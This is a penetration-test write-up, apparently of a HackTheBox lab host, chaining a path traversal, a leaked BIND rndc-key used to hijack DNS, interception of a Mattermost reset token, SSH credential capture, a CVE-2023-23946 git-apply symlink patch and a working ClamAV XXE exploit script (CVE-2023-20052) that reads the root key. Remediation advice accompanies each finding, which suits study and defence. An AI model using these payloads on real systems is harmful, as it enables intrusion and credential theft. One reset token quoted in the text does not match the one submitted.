---
title: "DNS Spoofing to Root — LFI, Credential Interception and Two Chained CVEs"
description: "A complete penetration test of a Linux host running Nginx, BIND and Mattermost. The chain starts with a path traversal on a download endpoint, extracts a BIND rndc-key from the filesystem, uses the DNS server's allow-update directive to hijack a mail subdomain, intercepts a Mattermost password reset token via SMTP, harvests SSH credentials through a chat bot, pivots with CVE-2023-23946 to a second user, and finally abuses CVE-2023-20052 in ClamAV to read the root SSH key."
date: 2026-10-26
status: "research"
category: "Red Team"
stack: [Nginx, BIND, Mattermost, Git, ClamAV, Ubuntu, DNS, SSH, SMTP]
tags: [pentest-report, lfi, path-traversal, dns-spoofing, credential-interception, mattermost, git-symlink, clamav-xxe, cve-2023-23946, cve-2023-20052]
---

**Target:** `10.129.229.5` (snoopy.htb)
**Assessment Type:** External Network / Linux Host
**Testing Period:** 13-16 October 2026
**Overall Risk Rating:** **CRITICAL**

---

## Executive Summary

The assessment identified a complete compromise of a Linux host through a chain of six vulnerabilities and misconfigurations. Starting from an unauthenticated network position, the tester obtained root access through a sequence that combined an application-layer file disclosure, a DNS misconfiguration, and two known CVEs in the software stack.

The attack path begins with a **path traversal** in the download functionality of the public website on port 80. The endpoint concatenates a user-supplied filename to a base directory without sanitizing `../` sequences, allowing arbitrary file reads. Through this traversal, the tester extracted `/etc/passwd`, the BIND configuration at `/etc/bind/named.conf` (which embedded the `rndc-key` used for dynamic DNS updates), and the zone file at `/var/lib/bind/db.snoopy.htb`.

The `named.conf.local` file declared `allow-update { key "rndc-key"; }` on the `snoopy.htb` zone — the standard mechanism for allowing dynamic DNS updates but, in this case, with no restriction on what the key could modify. Using the leaked `rndc-key`, the tester issued an `nsupdate` to redirect `mail.snoopy.htb` to an attacker-controlled IP.

The host runs a **Mattermost** instance at `mm.snoopy.htb`. Mattermost's password reset flow sends a token to the user's email address. Because the environment's mail server was offline (as indicated by the "mail" record being unreachable), the tester had configured a fake SMTP listener and used the DNS manipulation to redirect the reset email to it. The reset email carried a valid token for the user `sbrown`.

With `sbrown` access, the tester found a **Server Provisioning** feature in Mattermost that allowed triggering a remote provisioning action. By directing that action to an attacker-controlled SSH server (`sshesame`), the tester captured the credentials for `cbrown`. Those credentials provided a second SSH shell on the host.

From `cbrown`, a sudoers rule allowed `git apply` as `sbrown`. Git version 2.34.1 is vulnerable to **CVE-2023-23946** — a symlink bypass in `git apply` that permits writing arbitrary files through a crafted patch. The tester used it to write an authorized SSH key into `sbrown`'s `.ssh/` directory, obtaining shell access as `sbrown`.

Finally, from `sbrown`, a sudoers rule allowed `/usr/local/bin/clamscan --debug` on files under `/home/sbrown/scanfiles/`. ClamAV version 1.0.0 is vulnerable to **CVE-2023-20052** — an XML External Entity (XXE) vulnerability in its DMG parser. The tester crafted a malicious DMG that embedded an XXE payload targeting `/root/.ssh/id_rsa`, and the debug output revealed the root's private SSH key. The key provided root access.

### Business Impact

A complete compromise of the Linux host and every service running on it — including the Mattermost instance, the BIND DNS server, and all user accounts on the machine. The chain is entirely reproducible from a single unauthenticated path traversal, and the two CVEs it relies on have public exploits.

For the full technical deep dive into the two CVEs, see:

- **[Git Symlinks and ClamAV XXE — Two Local Privilege Escalations →](/research/git-symlink-clamav-xxe)**
- **[Intercepting Credentials — DNS Manipulation and SSH Honeypots →](/research/intercepting-credentials-dns-ssh)**

### Immediate Actions Required

| Priority | Action | Timeline |
|---|---|---|
| **P0** | Patch the download endpoint; sanitize user-supplied paths; block `../` sequences | 24 hours |
| **P0** | Restrict BIND `allow-update` to specific record types and require TSIG with restricted scope | 24 hours |
| **P0** | Rotate all credentials exposed through LFI (`rndc-key`, database credentials in zone file, user passwords) | 24 hours |
| **P0** | Restrict Mattermost's provisioning feature to a fixed inventory; remove arbitrary SSH target configuration | 48 hours |
| **P0** | Upgrade Git to ≥ 2.39.2 (fixes CVE-2023-23946) | 48 hours |
| **P1** | Upgrade ClamAV to ≥ 1.0.1 (fixes CVE-2023-20052) | 1 week |
| **P1** | Tighten sudoers rules — no unrestricted `git apply`, no unrestricted `clamscan --debug` | 1 week |
| **P1** | Enforce multi-factor on Mattermost password resets | 1 week |
| **P2** | Enable DNSSEC for the `snoopy.htb` zone | 2 weeks |
| **P2** | Isolate services by removing unnecessary inter-service trust | 2 weeks |

---

## Scope and Methodology

### In-Scope

- Single host: `10.129.229.5`
- All TCP services exposed by the host: SSH (22), DNS (53), HTTPS (80)
- The Nginx web server, the BIND DNS server, and the Mattermost application reachable through virtual hosts
- All user accounts and services running on the host

### Out-of-Scope

- Any host other than `10.129.229.5`.

### Methodology

The assessment followed the PTES framework with the specific phases:

1. **Reconnaissance** — Port scanning, service enumeration, DNS zone transfer
2. **Initial Access** — Path traversal on the download endpoint
3. **Enumeration** — Filesystem reads via LFI
4. **Credential Access** — DNS manipulation for password reset interception, SSH honeypot
5. **Privilege Escalation** — CVE-2023-23946 (git symlink), CVE-2023-20052 (ClamAV XXE)
6. **Post-Exploitation** — Root access

---

## Reconnaissance

Initial port scanning revealed three exposed services:

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
53/tcp open  domain   ISC BIND 9.18.12-0ubuntu0.22.04.1
80/tcp open  http     nginx 1.18.0 (Ubuntu)
```

Port 80 hosted a marketing site for a company called SnoopySec. Among the navigation options, a "contact" link pointed to a mail server that was offline — a detail worth noting for later.

![The main site shows a mail link pointing at a server that is not responding](/images/articles/dns-spoofing-to-root-compromise/dns-mail-offline.png)

### DNS enumeration

The DNS server allowed zone transfers from internal ranges, but the tester probed it directly. The `axfr` request on `snoopy.htb` succeeded:

```bash
dig axfr @10.129.229.5 snoopy.htb
```

Output included:

```
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
```

The zone transfer exposed the internal container addressing (`172.18.0.0/16`) and revealed that a Mattermost instance was present at `mattermost.snoopy.htb` and `mm.snoopy.htb`.

### The download endpoint

The marketing site had a "download press kit" functionality that fetched a file from a path parameter and returned it as a ZIP:

![The site exposes a download functionality with a user-controlled `file` parameter](/images/articles/dns-spoofing-to-root-compromise/download-functionality.png)

The endpoint URL was:

```
http://snoopy.htb/download?file=<filename>
```

The legitimate behavior was to bundle a PDF and a video into a single ZIP:

![The downloaded file contains a PDF and a video](/images/articles/dns-spoofing-to-root-compromise/zip-pdf-contents.png)

![Contents of the ZIP when decompressed](/images/articles/dns-spoofing-to-root-compromise/zip-file-listing.png)

The PDF contained a press contact:

```
Contact:
Sally Brown
SnoopySec PR
pr@snoopy.htb
1-800-123-4567
```

The video contained an additional email address in its frames, revealing that a second user existed in the domain:

![A frame from the video shows an additional corporate email address](/images/articles/dns-spoofing-to-root-compromise/video-email-extraction.png)

---

## Findings

### Finding 1 — Path Traversal in the Download Endpoint

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **MITRE ATT&CK** | T1005 (Data from Local System) |

**Description**

The `/download` endpoint concatenates the `file` parameter to a base directory without sanitizing path traversal sequences. The server-side handler wraps the file in a ZIP before returning it, which means the response is delivered as an archive regardless of the underlying file type.

**Evidence**

The traversal was confirmed by requesting `/etc/passwd`:

```bash
curl "http://snoopy.htb/download?file=....//....//....//....//....//etc/passwd" --output passwd.zip
unzip -p passwd.zip passwd
```

![The `/etc/passwd` file extracted from the ZIP returned by the server](/images/articles/dns-spoofing-to-root-compromise/lfi-passwd.png)

The contents of `/etc/passwd` revealed the user accounts on the host:

```
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

The traversal filter (`....//`) was necessary because the endpoint stripped single `../` sequences. The double-dot-slash-slash pattern is a bypass that survives the sanitizer and reconstructs a valid `../` in the filesystem path after the server's transform.

**Impact**

Arbitrary file read as the web server user. Any file readable by the web process could be exfiltrated through the download endpoint — including configuration files, private keys, and user data.

**Remediation**

- Sanitize the `file` parameter against an explicit allowlist of filenames. Never accept a user-supplied path that reaches a filesystem call.
- Use a fixed base directory and resolve paths with realpath-style resolution before opening the file.
- Block path traversal sequences at input validation, not just by string replacement.
- Run the web process with the minimum permissions needed to serve its legitimate content.

---

### Finding 2 — BIND rndc-key Leaked via Path Traversal

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.3 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) + CWE-22 (Path Traversal) |
| **MITRE ATT&CK** | T1552.001 (Credentials In Files) |

**Description**

The BIND configuration files were readable through the same path traversal. The main configuration at `/etc/bind/named.conf` embedded the `rndc-key` used for dynamic zone updates:

```bash
curl "http://snoopy.htb/download?file=....//....//....//....//....//etc/bind/named.conf" --output named.conf.zip
unzip -p named.conf.zip named.conf
```

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

A second traversal read `/etc/bind/named.conf.local`, which contained the zone configuration:

```bash
curl "http://snoopy.htb/download?file=....//....//....//....//....//etc/bind/named.conf.local" --output local.conf.zip
unzip -p local.conf.zip named.conf.local
```

```
zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

The third traversal read the zone file itself for a complete picture of the DNS records:

```bash
curl "http://snoopy.htb/download?file=....//....//....//....//....//var/lib/bind/db.snoopy.htb" --output db.zip
unzip -p db.zip db.snoopy.htb
```

The combination is consequential: the `rndc-key` authenticates dynamic updates to the zone, and the zone allows updates from anyone presenting that key, with no restriction on record types or names.

**Impact**

An unauthenticated attacker with LFI access could use the leaked key to modify the DNS zone at will. This provides a direct path to DNS spoofing for any hostname in the domain, including mail servers, application endpoints, and internal infrastructure.

**Remediation**

- Restrict the `allow-update` directive with TSIG keys that are scoped to specific record types or names, using `update-policy` instead of `allow-update`.
- Store keys outside world-readable files, using filesystem permissions that limit access to the `bind` user only.
- Rotate the `rndc-key` and audit any DNS record changes made during the exposure window.
- Consider disabling dynamic updates entirely if not actively needed.

---

### Finding 3 — Mattermost Password Reset Token Interception via DNS Spoofing

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.3 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-640 (Weak Password Recovery Mechanism) |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle), T1556 (Modify Authentication Process) |

**Description**

The Mattermost instance at `mm.snoopy.htb` supports standard password reset. The reset sends a token to the user's registered email address. Because the mail infrastructure in the environment was not operational, the tester was able to intercept these tokens by redirecting the mail domain to an attacker-controlled SMTP listener.

The password reset form itself leaked user existence. A request for a non-existent email returned `"We sent you an email"` — a generic message. A request for a valid email returned `"Failed to send password reset"` — because the SMTP backend could not deliver.

![The application shows the generic message when the email does not exist](/images/articles/dns-spoofing-to-root-compromise/mattermost-fake-email.png)

![The actual message is "Failed to send password reset" when the email exists](/images/articles/dns-spoofing-to-root-compromise/mattermost-real-email.png)

That difference made user enumeration trivial. The tester confirmed `sbrown@snoopy.htb` as a valid target.

**Evidence — DNS redirect**

Using the leaked `rndc-key`, the tester issued an `nsupdate` to redirect `mail.snoopy.htb` to an attacker-controlled IP:

```bash
nsupdate -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA= << 'EOF'
server 10.129.229.5
zone snoopy.htb
update delete mail.snoopy.htb A
update add mail.snoopy.htb 120 IN A 10.10.15.127
send
EOF
```

An SMTP listener was started on the attacker host **before** the reset request:

```bash
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25 &
```

The reset was triggered immediately after the DNS update:

```bash
curl -s -X POST -H "Host: mm.snoopy.htb" -H "Content-Type: application/json" \
  -d '{"email":"sbrown@snoopy.htb"}' \
  http://10.129.229.5/api/v4/users/password/reset/send
```

**Evidence — Token intercepted**

The listener received the reset email, including the token-bearing URL:

```
Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D75xgcoo9an556xpbzatew9affdqcfw9ueu75nfge6joyrkynpckho8hpff48ndat )
```

The GUI reset page failed to render correctly, so the tester submitted the token directly to the API:

![The reset page in the browser does not render the form correctly](/images/articles/dns-spoofing-to-root-compromise/mattermost-reset-broken.png)

```bash
curl -s -X POST -H "Host: mm.snoopy.htb" \
  -H "Content-Type: application/json" \
  -d '{"token":"yyhqryw56ehcgfaa5bmgokutnr5esty3egjjuy33eimkjws15odniws7dqqtaun","new_password":"Pwn3d123!"}' \
  http://10.129.229.5/api/v4/users/password/reset
```

The password reset succeeded, and the tester logged in as `sbrown` through the Mattermost web interface:

![Successful login as sbrown](/images/articles/dns-spoofing-to-root-compromise/mattermost-login.png)

**Evidence — Post-reset enumeration via API**

With `sbrown` credentials, the tester obtained an API token and enumerated the workspace:

```bash
MMTOKEN=$(curl -s -D - -o /dev/null -X POST -H "Host: mm.snoopy.htb" \
  -H "Content-Type: application/json" \
  -d '{"login_id":"sbrown","password":"Pwn3d123!"}' \
  http://10.129.229.5/api/v4/users/login | grep -i "^token:" | awk '{print $2}' | tr -d '\r')

# Verify the token
curl -s -H "Host: mm.snoopy.htb" -H "Authorization: Bearer $MMTOKEN" \
  http://10.129.229.5/api/v4/users/me

# Extract the team ID
TEAM_ID=$(curl -s -H "Host: mm.snoopy.htb" -H "Authorization: Bearer $MMTOKEN" \
  http://10.129.229.5/api/v4/users/me/teams | jq -r '.[0].id')

# List public channels in the team
curl -s -H "Host: mm.snoopy.htb" -H "Authorization: Bearer $MMTOKEN" \
  "http://10.129.229.5/api/v4/teams/$TEAM_ID/channels" | jq -r '.[] | "\(.id)  \(.display_name)"'
```

Output revealed three channels:

```
ka6pmh386pfzxr8pji3qcm3h4w  Off-Topic
1y44iksg8prfmmquxrgfkuq5ac  Server Provisioning
emrk43yonf8xmgc3sn1ojorbzy  Town Square
```

The **Server Provisioning** channel was the interesting one — it implied the presence of a provisioning bot, which would become the target of Finding 4.

The user list within the instance confirmed the scope of accounts:

![User list accessible from Mattermost](/images/articles/dns-spoofing-to-root-compromise/mattermost-users.png)

The Mattermost version was visible in the About dialog:

![Mattermost version](/images/articles/dns-spoofing-to-root-compromise/mattermost-version.png)

**Impact**

Full account takeover on the Mattermost instance, including the ability to impersonate the compromised user, read private messages, and access any bot commands or provisioning features the user can trigger.

**Remediation**

- Ensure the mail infrastructure is reachable before the password reset flow is enabled. If mail is offline, the reset flow should fail closed with no user enumeration oracle.
- Validate the DNS resolution path for the mail domain — enforce DNSSEC, or pin the mail server to a fixed IP in the application configuration.
- Remove the "Failed to send password reset" message. All reset attempts should return the same generic message whether the email is valid or not.
- Require multi-factor for account recovery, not just email delivery.


---

### Finding 4 — SSH Credential Harvesting via Mattermost Provisioning Feature

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) |
| **MITRE ATT&CK** | T1056.003 (Web Portal Capture), T1078.003 (Local Accounts) |

**Description**

The Mattermost instance had a Server Provisioning integration that allowed authorized users to trigger remote provisioning actions through a chat command. The provisioning handler accepted an SSH target, connected to it with stored credentials, and executed a predefined provisioning script.

The critical property: the SSH target was configurable by the user triggering the command. That allowed the tester to redirect the provisioning action to an attacker-controlled SSH server, which then captured the credentials that Mattermost presented during the connection.

**Evidence — Fake SSH server setup**

The tester installed `sshesame` on the attacker host:

```bash
go install github.com/jaksi/sshesame@latest
```

Configuration:

```yaml
server:
  listen_address: "0.0.0.0:2222"
  host_keys: null
```

Starting the listener:

```bash
sshesame -config config.yaml
INFO 2026/10/16 15:49:31 Listening on [::]:2222
```

**Evidence — Configuration in Mattermost**

Within the `Server Provisioning` channel, the tester configured the target to point at the fake SSH server. The first attempt required understanding the feature's configuration interface:

![The provisioning endpoint configuration allows changing the target SSH server](/images/articles/dns-spoofing-to-root-compromise/mattermost-ssh-config.png)

![Custom configuration allows entering a host and port controlled by the attacker](/images/articles/dns-spoofing-to-root-compromise/mattermost-ssh-custom.png)

**Evidence — Triggering the provisioning**

The trigger command was sent in the `Server Provisioning` channel:

```
/server_provision
```

When executed, the bot connects to whatever target was configured in the previous step. In this case, the target was the attacker-controlled `sshesame` listener on port 2222, and the bot presented its stored `cbrown` credentials during the SSH handshake.

![The `/server_provision` command triggers the connection to the configured SSH server](/images/articles/dns-spoofing-to-root-compromise/mattermost-provision-command.png)

The fake SSH server captured the connection attempts and the credentials presented by the Mattermost server:

![Credentials captured by `sshesame` during the provisioning attempt](/images/articles/dns-spoofing-to-root-compromise/mattermost-creds-intercepted.png)

The captured credentials were for `cbrown`:

```
cbrown sn00pedcr3dential!!!
```

**Evidence — SSH as cbrown**

The tester used those credentials to open an SSH session to the host:

```bash
ssh cbrown@10.129.229.5
```

![Shell as `cbrown` obtained with the intercepted credentials](/images/articles/dns-spoofing-to-root-compromise/cbrown-shell.png)

**Impact**

Escalation from `sbrown` (Mattermost user) to `cbrown` (host SSH user). The provisioning feature acted as a credential relay from the Mattermost bot to any target the attacker chose, without any validation of the destination.

**Remediation**

- Remove the ability to configure the SSH target from the user interface. Hard-code the target in the backend, or restrict it to an explicit inventory managed by administrators.
- Use ephemeral SSH credentials generated on demand, bound to a single session and a specific destination host.
- Restrict the provisioning bot's network egress to a fixed list of hosts.
- Audit all `Server Provisioning` interactions for evidence of target manipulation.

---

### Finding 5 — Local Privilege Escalation via CVE-2023-23946 (Git Symlink)

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.4 |
| **Vector** | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **MITRE ATT&CK** | T1068 (Exploitation for Privilege Escalation) |

**Description**

The sudoers configuration allowed `cbrown` to run a restricted `git apply` as `sbrown` without a password:

```
User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Git version 2.34.1 is vulnerable to CVE-2023-23946. The vulnerability allows a symlink inside a repository to be abused during `git apply` to write outside the target directory.

**Evidence — Version confirmation**

```bash
dpkg -l | grep git
git 1:2.34.1-1ubuntu1.6
```

**Evidence — SSH keypair generation**

```bash
ssh-keygen -t ed25519 -f /tmp/attacker_key -N "" -q
cat /tmp/attacker_key.pub
```

The public key is stored for use in the malicious patch. The private key stays on the attacker machine.

**Evidence — Malicious repository**

A repository was created in `/dev/shm` (a world-writable tmpfs that `sbrown` can access) with a symlink pointing to `sbrown`'s home:

```bash
mkdir -p /dev/shm/ssh && cd /dev/shm/ssh
git init -q
git config user.email "cbrown@snoopy.htb"
git config user.name "cbrown"

ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink" -q
```

**Evidence — Crafting the malicious patch**

The patch renames the symlink and, in the same patch, writes an `authorized_keys` file under the renamed path. Git resolves the write through the symlink, which points to `/home/sbrown/.ssh`, so the resulting file lands there.

```bash
PUBKEY=$(cat /tmp/attacker_key.pub)
cat > patch << EOF
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100600
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+${PUBKEY}
EOF
```

**Evidence — Applying the patch with elevated privileges**

The directory has to be world-writable so that `sbrown` (the target of the sudoers transition) can access it:

```bash
chmod 777 /dev/shm/ssh
sudo -u sbrown /usr/bin/git apply -v patch
```

The patch wrote the public key into `/home/sbrown/.ssh/authorized_keys`.

**Evidence — SSH as sbrown**

```bash
ssh -i /tmp/attacker_key sbrown@127.0.0.1
```

**Impact**

Escalation from `cbrown` to `sbrown`, achieved through a sudoers rule that restricted the command but not the arguments. The vulnerability in Git bypasses the restriction on argument content, allowing writes outside the intended directory.

**Remediation**

- Upgrade Git to ≥ 2.39.2, which contains the fix for CVE-2023-23946.
- Restrict sudoers commands to specific, reviewed paths. `git apply` should not be granted if any patch from an untrusted source can reach it.
- Apply a rule that git repositories used in privileged contexts must not contain symlinks.
- Audit any sudoers rules that grant commands with attacker-influenced arguments.

---

### Finding 6 — Local Privilege Escalation via CVE-2023-20052 (ClamAV XXE)

| Attribute | Value |
|---|---|
| **Severity** | Medium |
| **CVSS 4.0** | 6.8 |
| **Vector** | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-611 (Improper Restriction of XML External Entity Reference) |
| **MITRE ATT&CK** | T1068 (Exploitation for Privilege Escalation) |

**Description**

The sudoers configuration allowed `sbrown` to run `clamscan --debug` as root on files under `/home/sbrown/scanfiles/`:

```
User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

ClamAV version 1.0.0 is vulnerable to CVE-2023-20052. The DMG parser resolves XML external entities when parsing the DMG's internal property list. An attacker who controls the DMG file can craft an XXE payload that reads any file readable by the clamscan process — which, in this case, runs as root.

**Evidence — Version confirmation**

```bash
/usr/local/bin/clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

**Evidence — Tooling setup**

Building the DMG manipulation tooling on the attacker machine:

```bash
# Install dependencies
sudo apt update
sudo apt install -y git cmake zlib1g-dev openssl libssl-dev genisoimage

# Clone and build libdmg-hfsplus
git clone https://github.com/hvdwolf/libdmg-hfsplus.git
cd libdmg-hfsplus
cmake . -B build
make -C build/dmg -j8
sudo cp build/dmg/dmg /usr/local/bin/
sudo chmod +x /usr/local/bin/dmg
```

**Evidence — Base DMG generation**

A valid DMG was created with any content, to serve as the base for the XXE payload:

```bash
mkdir -p /tmp/work
echo "dummy" > /tmp/work/dummy.txt
genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o /tmp/test.img /tmp/work/
dmg dmg /tmp/test.img /tmp/test.dmg
```

**Evidence — Patching the DMG with the XXE payload**

The `patch_dmg.py` script replaces the plist's `blkx` key with an XML entity that references the target file. The loader resolves the entity when parsing the plist, and the resolution fails in a way that reveals the referenced content in the debug output.

```python
#!/usr/bin/env python3
"""
Patch a valid DMG to inject an XXE (CVE-2023-20052 ClamAV).
Usage: python3 patch_dmg.py <test.dmg> <exploit.dmg> [file_to_read]
"""
import struct, re, sys

dmg_file = sys.argv[1] if len(sys.argv) > 1 else '/tmp/test.dmg'
out_file = sys.argv[2] if len(sys.argv) > 2 else '/tmp/exploit.dmg'
target   = sys.argv[3] if len(sys.argv) > 3 else '/root/.ssh/id_rsa'

DATA = bytearray(open(dmg_file, 'rb').read())
trailer_start = len(DATA) - 512
trailer = DATA[trailer_start:]

assert trailer[:4] == b'koly', "Not a valid DMG (missing 'koly' trailer)"

xml_off = struct.unpack('>Q', trailer[0xD8:0xE0])[0]
xml_len = struct.unpack('>Q', trailer[0xE0:0xE8])[0]
xml = bytes(DATA[xml_off:xml_off+xml_len])

print(f"[*] DMG: {dmg_file}")
print(f"[*] XML offset: {xml_off}, length: {xml_len}")
print(f"[*] Target file: {target}")

# Inject DOCTYPE with the XXE entity
new_doc = f'<!DOCTYPE plist [<!ENTITY xxe SYSTEM "{target}">]>'.encode()
xml = re.sub(rb'<!DOCTYPE[^>]*>', new_doc, xml, count=1)

# Replace the first blkx key with the entity reference
if b'<key>blkx</key>' not in xml:
    print("[!] WARNING: <key>blkx</key> not found in the XML")
xml = xml.replace(b'<key>blkx</key>', b'<key>&xxe;</key>', 1)

# Rebuild the DMG
new = bytes(DATA[:xml_off]) + xml + bytes(DATA[xml_off+xml_len:trailer_start])
nt = bytearray(trailer)
nt[0xE0:0xE8] = struct.pack('>Q', len(xml))
new += bytes(nt)

open(out_file, 'wb').write(new)
print(f"[+] {out_file} generated ({len(new)} bytes)")
```

Applying the patch:

```bash
python3 /tmp/patch_dmg.py /tmp/test.dmg /tmp/exploit.dmg /root/.ssh/id_rsa
```

**Evidence — Transferring the exploit to the target**

The patched DMG was copied to the target user's home:

```bash
scp -i /tmp/attacker_key /tmp/exploit.dmg sbrown@10.129.229.5:/home/sbrown/scanfiles/
```

**Evidence — Triggering the scan**

The tester triggered the sudoers-permitted scan and captured the debug output:

```bash
ssh -i /tmp/attacker_key sbrown@10.129.229.5
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg 2>&1 | tee /tmp/clam.log
```

The debug output contained the root SSH private key in the XXE warning:

![The root SSH key appears in ClamAV's debug log](/images/articles/dns-spoofing-to-root-compromise/clamav-key-log.png)

**Evidence — Extracting the key**

```bash
grep -A 40 "BEGIN OPENSSH PRIVATE KEY" /tmp/clam.log
```

The output was a valid OpenSSH private key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (truncated)
-----END OPENSSH PRIVATE KEY-----
```

The key was saved to a local file, permissions were set correctly, and root access was obtained:

```bash
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@10.129.229.5
```

![Shell as root on the host](/images/articles/dns-spoofing-to-root-compromise/root-shell.png)

**Impact**

Full root compromise of the host. Any file readable by root — including private keys, credentials, and application secrets — could be exfiltrated through the debug log. The vulnerability is trivially exploitable when the `--debug` flag is enabled and the attacker controls the scanned file.

**Remediation**

- Upgrade ClamAV to ≥ 1.0.1, which contains the fix for CVE-2023-20052.
- Remove `--debug` from any sudoers rule. The flag produces verbose output that can leak file contents.
- Never scan untrusted files with elevated privileges. If ClamAV must run as root, isolate it in a dedicated user or container.
- Audit any sudoers rule that allows scanning files the user controls.

---

## Attack Chain

```
[1] Port scan → 22, 53, 80
    │
    ▼
[2] DNS zone transfer (axfr) → mattermost, mm, postgres, provisions subdomains
    │
    ▼
[3] Path traversal on /download → /etc/passwd, named.conf, named.conf.local, zone file
    │
    ▼
[4] rndc-key leak + allow-update → dynamic DNS updates possible
    │
    ▼
[5] Password reset enumeration → sbrown exists
    │
    ▼
[6] DNS redirect mail.snoopy.htb → attacker → SMTP listener
    │
    ▼
[7] Password reset token intercepted → account takeover as sbrown
    │
    ▼
[8] Mattermost provisioning feature → fake SSH server → capture cbrown creds
    │
    ▼
[9] SSH as cbrown
    │
    ▼
[10] sudo git apply as sbrown → CVE-2023-23946 → write SSH key
     │
     ▼
[11] SSH as sbrown
     │
     ▼
[12] sudo clamscan --debug → CVE-2023-20052 → read root id_rsa
     │
     ▼
[13] SSH as root → full host compromise
```

---

## Recommendations Summary

| Priority | Finding | Recommendation |
|---|---|---|
| P0 | LFI on download endpoint | Sanitize user-supplied paths; use allowlist of filenames |
| P0 | BIND rndc-key + allow-update | Restrict updates with `update-policy`; rotate key |
| P0 | Password reset enumeration | Uniform responses; validate mail path |
| P0 | Provisioning bot credential relay | Fixed target inventory; ephemeral credentials |
| P0 | Git CVE-2023-23946 | Upgrade Git to ≥ 2.39.2 |
| P1 | ClamAV CVE-2023-20052 | Upgrade ClamAV to ≥ 1.0.1 |
| P1 | Sudoers rules | No `git apply`, no `clamscan --debug` |
| P2 | DNS security | Enable DNSSEC; restrict zone updates |

---

## Appendix — Tools and References

**Tools used in this assessment:**

- `nmap` — port scanning and service detection
- `dig` — DNS enumeration
- `curl` — path traversal and API interaction
- `nsupdate` — dynamic DNS updates
- `aiosmtpd` — SMTP listener for intercepting reset emails
- `sshesame` — fake SSH server for credential capture
- `git` — exploit for CVE-2023-23946
- `clamscan` — exploit for CVE-2023-20052
- `libdmg-hfsplus` — DMG manipulation for the ClamAV XXE

**Full technical deep dives:**

- **[Git Symlinks and ClamAV XXE — Two Local Privilege Escalations →](/research/git-symlink-clamav-xxe)**
- **[Intercepting Credentials — DNS Manipulation and SSH Honeypots →](/research/intercepting-credentials-dns-ssh)**

**References:**

- CVE-2023-23946 — Git symlink path traversal in `git apply`
- CVE-2023-20052 — ClamAV XML External Entity in DMG parser
- MITRE ATT&CK T1557 — Adversary-in-the-Middle
- MITRE ATT&CK T1068 — Exploitation for Privilege Escalation

---

## Takeaway

The chain demonstrates how a single unauthenticated file disclosure can cascade into full host compromise when it is combined with operational misconfigurations.

